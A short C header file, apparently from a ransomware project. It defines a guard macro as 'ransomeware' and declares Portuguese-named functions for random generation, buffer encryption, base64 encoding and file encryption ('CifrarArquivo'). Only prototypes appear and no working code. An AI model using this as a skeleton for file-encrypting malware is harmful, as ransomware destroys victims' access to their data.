#ifndef __list__
#define __list__ "ransomeware"

int GerarNomes(void);

size_t CriarRandom(int tamanhoBytes);

int CryptBuffer(char *,char *,size_t );

void b64_encode(char *clrstr, char *b64dst);
void b64_decode(char *b64src, char *clrdst);


int CifrarArquivo(char *,char *chave);

#endif
